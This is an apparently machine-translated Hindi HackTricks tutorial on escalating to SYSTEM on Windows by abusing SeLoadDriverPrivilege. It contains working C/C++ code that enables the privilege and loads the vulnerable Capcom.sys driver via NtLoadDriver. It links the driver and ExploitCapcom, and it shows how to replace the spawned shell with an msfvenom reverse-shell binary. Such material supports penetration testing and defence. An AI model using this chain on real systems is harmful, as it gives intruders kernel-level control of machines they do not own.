# विशेषाधिकार SeLoadDriverPrivilege

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

किसी भी उपयोगकर्ता को सौंपने के लिए एक बहुत ही खतरनाक विशेषाधिकार - यह उपयोगकर्ता को कर्नेल ड्राइवर्स लोड करने और कर्नेल विशेषाधिकारों के साथ कोड निष्पादित करने की अनुमति देता है जिसे `NT\System` कहा जाता है। देखें कैसे `offense\spotless` उपयोगकर्ता के पास इस विशेषाधिकार है:

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` दिखाता है कि यह विशेषाधिकार डिफ़ॉल्ट रूप से अक्षम है:

![](../../../.gitbook/assets/a9.png)

हालांकि, नीचे कोड इस विशेषाधिकार को बहुत ही आसानी से सक्षम करने की अनुमति देता है:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

हम ऊपर दिए गए को कंपाइल करते हैं, और वो निष्क्रिय हो जाता है और विशेषाधिकार `SeLoadDriverPrivilege` अब सक्षम हो जाता है:

![](../../../.gitbook/assets/a10.png)

### Capcom.sys ड्राइवर शोषण <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

`SeLoadDriverPrivilege` खतरनाक होने को और अधिक साबित करने के लिए, चलो इसका शोषण करें **विशेषाधिकारों को उच्च करने** के लिए।

आप **NTLoadDriver** का उपयोग करके एक नया ड्राइवर लोड कर सकते हैं:
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
ड्राइवर सेवा नाम डिफ़ॉल्ट रूप से `\Registry\Machine\System\CurrentControlSet\Services\` के अंडर होना चाहिए।

लेकिन, **दस्तावेज़ीकरण** के अनुसार आप **HKEY\_CURRENT\_USER** के अंडर पथ का भी उपयोग कर सकते हैं, इसलिए आप सिस्टम पर **विभिन्न ड्राइवर्स लोड** करने के लिए वहाँ एक **रजिस्ट्री** में परिवर्तन कर सकते हैं।
नई रजिस्ट्री में परिभाषित होने चाहिए:

* **ImagePath:** REG\_EXPAND\_SZ प्रकार का मान जो ड्राइवर पथ को निर्दिष्ट करता है। इस संदर्भ में, पथ को एक नागरिक उपयोगकर्ता द्वारा संशोधन अनुमतियों वाले एक निर्देशिका होना चाहिए।
* **प्रकार:** REG\_WORD प्रकार का मान जिसमें सेवा का प्रकार निर्दिष्ट होता है। हमारे उद्देश्य के लिए, मान को SERVICE\_KERNEL\_DRIVER (0x00000001) के रूप में परिभाषित किया जाना चाहिए।

इसलिए आप **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** में एक नई रजिस्ट्री बना सकते हैं, **ImagePath** में ड्राइवर का पथ और **प्रकार** में मान 1 के साथ निर्दिष्ट करके उस उत्पादन पर उपयोग कर सकते हैं (आप उपयोगकर्ता SID प्राप्त करने के लिए इस्तेमाल कर सकते हैं: `Get-ADUser -Identity 'USERNAME' | select SID` या `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`।
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
पहला एक स्ट्रिंग वेरिएबल घोषित करता है जिससे पता चलता है कि पीड़ित सिस्टम पर कमजोर **Capcom.sys** ड्राइवर कहां स्थित है और दूसरा एक स्ट्रिंग वेरिएबल घोषित करता है जो उपयोग के लिए सेवा नाम दर्शाता है (कोई भी सेवा हो सकती है)।
ध्यान दें, **ड्राइवर को Windows द्वारा साइन किया जाना चाहिए** ताकि आप विचारशील ड्राइवर्स लोड नहीं कर सकते। लेकिन, **Capcom.sys** **को विचारशील कोड निष्पादित करने के लिए दुरुपयोग किया जा सकता है और यह Windows द्वारा साइन किया गया है**, इसलिए लक्ष्य यह ड्राइवर लोड करना है और इसका शोषण करना है।

ड्राइवर लोड करें:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
एक बार ऊपर दिए गए कोड को कंपाइल और निष्पादित किया जाता है, हम देख सकते हैं कि हमारा दुराचारी `Capcom.sys` ड्राइवर पीड़ित सिस्टम पर लोड हो जाता है:

![](../../../.gitbook/assets/a11.png)

डाउनलोड: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**अब समय है कि हम लोड किए गए ड्राइवर का दुरुपयोग करें ताकि विचित्र कोड को निष्पादित किया जा सके।**

आप [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) और [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) से उत्पादों को डाउनलोड कर सकते हैं और इसे सिस्टम पर निष्पादित करके हमारी वर्चस्व को `NT Authority\System` तक उन्नत कर सकते हैं:

![](../../../.gitbook/assets/a12.png)

### कोई ग्राफिकल यूजर इंटरफेस नहीं

यदि हमें लक्ष्य के लिए **जीयूआई एक्सेस नहीं** है, तो हमें **`ExploitCapcom.cpp`** को कंपाइल करने से पहले कोड को संशोधित करना होगा। यहाँ हम पंक्ति 292 को संपादित कर सकते हैं और `C:\\Windows\\system32\\cmd.exe"` की जगह, उदाहरण के लिए, `msfvenom` के साथ बनाए गए रिवर्स शैल बाइनरी के साथ बदल सकते हैं, जैसे: `c:\ProgramData\revshell.exe`।

कोड: c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
`इस उदाहरण में 'CommandLine' स्ट्रिंग को बदल दिया जाएगा:

कोड: c`
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
### स्वचालित

आप [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) का उपयोग करके **स्वचालित रूप से सक्षम** कर सकते हैं, **विशेषाधिकार** को **बनाएं**, HKEY\_CURRENT\_USER के तहत **रजिस्ट्री कुंजी** बनाएं और NTLoadDriver **को क्रियान्वित करें** जिसमें आपको बनाना है और ड्राइवर के पथ को दर्शाना है:

![](<../../../.gitbook/assets/image (289).png>)

फिर, आपको एक **Capcom.sys** उत्पीड़न डाउनलोड करने और उसका उपयोग करके विशेषाधिकारों को उन्नत करने की आवश्यकता होगी।
